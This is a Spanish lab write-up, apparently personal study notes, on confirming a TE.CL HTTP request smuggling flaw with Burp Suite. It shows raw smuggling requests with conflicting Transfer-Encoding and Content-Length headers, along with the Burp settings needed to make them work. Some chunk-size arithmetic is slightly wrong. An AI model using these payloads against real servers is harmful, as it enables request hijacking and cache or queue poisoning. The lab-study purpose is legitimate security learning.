# Confirmación de TE.CL por respuestas diferenciales

Tags: #HTTP_Smuggling #BurpSuite 

```bash 
En este lab se trabaja con una variante de HTTP request smuggling basada en la combinación TE.CL, donde el front-end permite codificación chunked y el back-end no. El objetivo es verificar si existe una desincronización entre ambos servidores manipulando los encabezados de longitud y codificación de la petición.

A través de dos envíos consecutivos desde Burp Repeater, provocamos una situación donde la segunda petición se ve afectada por los restos interpretados desde la primera, desencadenando una respuesta 404 inesperada en la raíz del sitio. Esta diferencia de comportamiento confirma la presencia del fallo, lo que nos permite avanzar hacia una posible explotación completa en una clase posterior.
```

```bash  
<!-- Peticion original --> 

	GET / HTTP/2
	Host: web.com 
	Cookie: session=123456
	User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
	Accept-Encoding: gzip, deflate, br
	Referer: https://portweb.com/
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: cross-site
	Priority: u=0, i
	Te: trailers 
```

```bash 
<!-- En este lab se debe causar un error 404 --> 

# En esta solicitud el front-end interpreta 'Transfer-Encoding' 
	POST / HTTP/1.1
	Host: web.com
	Transfer-Encoding: chunked 
	
	3
	abc
	0
	



# En esta solicitud final el front-end solo interpreta 'Transfer-Encoding' y cuando lo pase al back-end el interpretará el 'Content-Length', pero en este caso se debe de aumentar el 'Content-Length' pasando de 19 bytes a 20 bytes para que lea lo demás 

	POST / HTTP/1.1
	Host: web.com
	Transfer-Encoding: chunked 
	Content-Length: 4
	
	38
	POST /error HTTP/1.1
	Content-Length: 20        # Originalmente son 19 bytes 
	
	testing=test
	0
	
 

Notas:
	1. Cambiar el atributo de HTTP/2 a HTTP 1.1
	2. Cambiar el método de GET a POST
	3. En BurpSuite en la configuración desmarcar la opción 'Update Content-Length' para tomar el control del Content-Length en la petición 
	4. Activar '\r\n' en la petición de BurpSuite 
	5. Antes de la segunda solicitud se debe de colocar el tamaño que inicia desde POST y termina en 'test' el cual es igual a '50 (0x38)' por lo que solo se coloca '38'
	6. El 'Content-Length' es solo el tamaño que tiene el '38' y es 4 bytes 
	7. Desde testing hasta abajo del cero da un total de 19 bytes 
```